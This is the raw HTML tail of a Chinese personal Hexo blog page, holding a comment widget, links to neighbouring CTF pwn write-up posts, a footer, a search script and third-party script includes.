[type=checkbox]:not(:checked),[type=checkbox]:checked{position:inherit;margin-left:-1.3rem;margin-right:.4rem;margin-top:-1px;vertical-align:middle;left:unset;visibility:visible}</style><div class="card valine-card" data-aos="fade-up"><div class="comment_headling" style="font-size:20px;font-weight:700;position:relative;padding-left:20px;top:15px;padding-bottom:5px"><i class="fas fa-comments fa-fw" aria-hidden="true"></i> <span>评论</span></div><div id="vcomments" class="card-content" style="display:grid"></div></div><script src="/libs/valine/av-min.js"></script><script src="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/valine/Valine.min.js"></script><script>new Valine({el:"#vcomments",appId:"excc2DJ3RQhlHlvmDfAHHcZS-gzGzoHsz",appKey:"wB3BHnVFLZqkyMLZp4f752PQ",notify:!1,verify:!1,visitor:!0,avatar:"mm",pageSize:"10",lang:"zh-cn",placeholder:"just go go"})</script><article id="prenext-posts" class="prev-next articles"><div class="row article-row"><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge left-badge text-color"><i class="fas fa-chevron-left"></i>&nbsp;上一篇</div><div class="card"><a href="/ctf-pwn/9dd1a73d.html"><div class="card-image"><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-o561j7.jpg" class="responsive-img" alt="攻防世界pwn-greeting150"> <span class="card-title">攻防世界pwn-greeting150</span></div></a><div class="card-content article-content"><div class="summary block-with-text">攻防世界入门题</div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2024-07-25 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></span></div></div><div class="card-action article-tags"><a href="/tags/PWN/"><span class="chip bg-color">PWN</span></a></div></div></div><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge right-badge text-color">下一篇&nbsp;<i class="fas fa-chevron-right"></i></div><div class="card"><a href="/ctf-pwn/308238d8.html"><div class="card-image"><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-l8jxe2.jpg" class="responsive-img" alt="攻防世界pwn-supermarket"> <span class="card-title">攻防世界pwn-supermarket</span></div></a><div class="card-content article-content"><div class="summary block-with-text">攻防世界入门题</div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2024-07-25 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></span></div></div><div class="card-action article-tags"><a href="/tags/PWN/"><span class="chip bg-color">PWN</span></a></div></div></div></div></article></div><script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script><script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script><script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script><script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script></main><footer class="page-footer bg-color"><div class="container row center-align" style="margin-bottom:15px!important"><div class="col s12 m8 l8 copy-right">Copyright&nbsp;&copy; <span id="year">2023-2024</span> <span id="year">2023</span> <a href="/about" target="_blank">小哑师兄</a> |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a> |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a><br>&nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">10.5k</span>&nbsp;字 <span id="busuanzi_container_site_pv">|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv" class="white-color"></span>&nbsp;次 </span><span id="busuanzi_container_site_uv">|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv" class="white-color"></span>&nbsp;人</span><br><span id="sitetime">载入运行时间...</span><script>function siteTime(){var e=36e5,t=24*e,n=new Date,o="2023",r=n.getFullYear(),a=n.getMonth()+1,i=n.getDate(),l=n.getHours(),m=n.getMinutes(),n=n.getSeconds(),M=Date.UTC(o,"8","20","0","0","0"),a=Date.UTC(r,a,i,l,m,n)-M,i=Math.floor(a/31536e6),l=Math.floor(a/t-365*i),m=Math.floor((a-(365*i+l)*t)/e),n=Math.floor((a-(365*i+l)*t-m*e)/6e4),M=Math.floor((a-(365*i+l)*t-m*e-6e4*n)/1e3);o==r?(document.getElementById("year").innerHTML=r,document.getElementById("sitetime").innerHTML="本站已安全运行 "+l+" 天 "+m+" 小时 "+n+" 分钟 "+M+" 秒"):(document.getElementById("year").innerHTML=o+" - "+r,document.getElementById("sitetime").innerHTML="本站已安全运行 "+i+" 年 "+l+" 天 "+m+" 小时 "+n+" 分钟 "+M+" 秒")}setInterval(siteTime,1e3)</script><br><span id="icp"><img src="/medias/icp.png" style="vertical-align:text-bottom"> <a href="/null" target="_blank">京ICP备2023023075号</a></span></div><div class="col s12 m4 l4 social-link social-statis"><a href="https://github.com/xysxya" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50"><i class="fab fa-github"></i> </a><a href="mailto:1274860958@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50"><i class="fas fa-envelope-open"></i></a></div></div></footer><div class="progress-bar"></div><div id="searchModal" class="modal"><div class="modal-content"><div class="search-header"><span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span> <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input"></div><div id="searchResult"></div></div></div><script type="text/javascript">$(function(){!function(t,r,s){"use strict";$.ajax({url:t,dataType:"xml",success:function(t){var e=$("entry",t).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get(),t=document.getElementById(r),n=document.getElementById(s);t.addEventListener("input",function(){var o='<ul class="search-result-list">',h=this.value.trim().toLowerCase().split(/[\s\-]+/);n.innerHTML="",this.value.trim().length<=0||(e.forEach(function(t){var n,e,r,s=!0,i=t.title.trim().toLowerCase(),l=t.content.trim().replace(/<[^>]+>/g,"").toLowerCase(),a=0===(a=t.url).indexOf("/")?t.url:"/"+a,c=-1,u=-1;""!==i&&""!==l&&h.forEach(function(t,e){n=i.indexOf(t),c=l.indexOf(t),n<0&&c<0?s=!1:(c<0&&(c=0),0===e&&(u=c))}),s&&(o+="<li><a href='"+a+"' class='search-result-title'>"+i+"</a>",a=t.content.trim().replace(/<[^>]+>/g,""),0<=u&&(t=u+80,(t=0===(e=(e=u-20)<0?0:e)?100:t)>a.length&&(t=a.length),r=a.substr(e,t),h.forEach(function(t){var e=new RegExp(t,"gi");r=r.replace(e,'<em class="search-keyword">'+t+"</em>")}),o+='<p class="search-result">'+r+"...</p>"),o+="</li>")}),o+="</ul>",n.innerHTML=o)})}})}("/search.xml","searchInput","searchResult")})</script><div id="backTop" class="top-scroll"><a class="btn-floating btn-large waves-effect waves-light" href="#!"><i class="fas fa-arrow-up"></i></a></div><script src="https://cdn.staticfile.org/materialize/1.0.0/js/materialize.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/masonry/masonry.pkgd.min.js"></script><script src="https://cdn.staticfile.org/aos/2.3.4/aos.js"></script><script src="https://cdn.staticfile.org/scrollprogress/3.0.2/scrollProgress.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/lightGallery/js/lightgallery-all.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xysxya/xysxya/js/matery.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0],e=(t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js",document.getElementsByTagName("script")[0]);e.parentNode.insertBefore(t,e)}()</script><script async src="https://cdn.staticfile.org/busuanzi/2.3.0/bsz.pure.mini.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/background/ribbon-dynamic.js" async></script><script src="https://cdn.staticfile.org/instant.page/5.2.0/instantpage.js" type="module"></script></body></html>